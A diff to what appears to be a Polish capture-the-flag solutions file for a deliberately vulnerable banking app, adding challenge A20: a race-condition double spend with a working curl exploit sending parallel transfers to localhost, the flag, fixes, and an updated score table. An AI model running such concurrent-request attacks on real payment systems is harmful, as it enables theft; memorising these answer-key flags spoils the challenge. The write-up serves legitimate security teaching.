@@ -639,6 +639,40 @@ Wyłącz source maps w buildzie produkcyjnym i nie serwuj publicznie plików `.m
 
 ---
 
+## A20 — Race Condition (Double Spend)
+**Flaga:** `PWR{race_condition_double_spend}`
+**Trudność:** hard | **Punkty:** 200
+
+### Podatność
+Dedykowany endpoint `/api/challenges/a20/transfer-race` wykonuje check-then-act:
+najpierw pobiera saldo, potem czeka (`sleep(0.55)`), a dopiero potem aktualizuje
+konto. Dwa równoległe requesty mogą przeczytać to samo saldo i oba przejść walidację,
+co pozwala na podwójne wydanie tych samych środków.
+
+### Exploit
+
+```bash
+BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+# Wykonaj dwa równoległe przelewy 1500 PLN do konta Alice
+seq 2 | xargs -P 2 -I{} curl -sS -X POST http://localhost:5000/api/challenges/a20/transfer-race \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"to_iban":"PL00100100100100100100100100","amount":1500,"title":"A20 race {}"}'
+```
+
+### Weryfikacja
+Jeśli oba requesty przeszły walidację, saldo Boba spadnie poniżej zera, a jedno
+z odpowiedzi zwróci flagę w polu `flag`.
+
+### Naprawa
+- Zrób walidację salda i aktualizację w jednej transakcji.
+- Zablokuj wiersz konta (`SELECT ... FOR UPDATE`) lub użyj atomowego `UPDATE ... WHERE balance >= :amount`.
+- Usuń opóźnienie i nie rozdzielaj sprawdzenia od zapisu na różne transakcje.
+
 ## Łączny wynik
 
 | # | Flaga | Pkt |
@@ -662,4 +696,6 @@ Wyłącz source maps w buildzie produkcyjnym i nie serwuj publicznie plików `.m
 | A17 | PWR{exposed_internal_token} | 100 |
 | A18 | PWR{t1mpl4t3_inj3ct10n} | 200 |
 | A19 | PWR{S0urc3_M4ps_L34k} | 100 |
-| **Suma** | | **2500** |
+| A20 | PWR{race_condition_double_spend} | 200 |
+| **Suma** | | **2700** |
+
